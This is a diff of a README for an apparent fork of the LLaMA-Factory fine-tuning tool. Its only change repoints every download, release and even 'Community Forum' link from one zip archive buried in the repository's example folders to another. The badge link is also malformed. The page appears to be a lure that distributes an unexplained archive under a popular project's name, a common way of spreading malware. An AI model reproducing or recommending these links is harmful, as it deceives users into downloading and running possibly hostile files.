@@ -1,6 +1,6 @@
 # 🦙 LLaMA-Factory - Fine-Tune AI Models Effortlessly
 
-[![Download LLaMA-Factory](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip)](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip)
+[![Download LLaMA-Factory](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip)](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ LLaMA-Factory offers a variety of features for users:
 
 To get started, visit the Releases page to download the latest version of LLaMA-Factory.
 
-[**Download LLaMA-Factory**](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip)
+[**Download LLaMA-Factory**](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip)
 
 ### Steps to Download:
 
@@ -67,7 +67,7 @@ If you encounter issues or have questions, you are not alone. Join our community
 
 ## 🔗 Useful Links
 
-- [LLaMA-Factory Releases](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/examples/megatron/LLaMA-Factory_1.4.zip)
+- [LLaMA-Factory Releases](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/Christoferactinomycetal309/LLaMA-Factory/main/scripts/convert_ckpt/Factory_La_M_L_3.7.zip)
 
 Thank you for using LLaMA-Factory! Your journey into the world of AI fine-tuning begins here. Enjoy exploring new possibilities with advanced models at your fingertips.
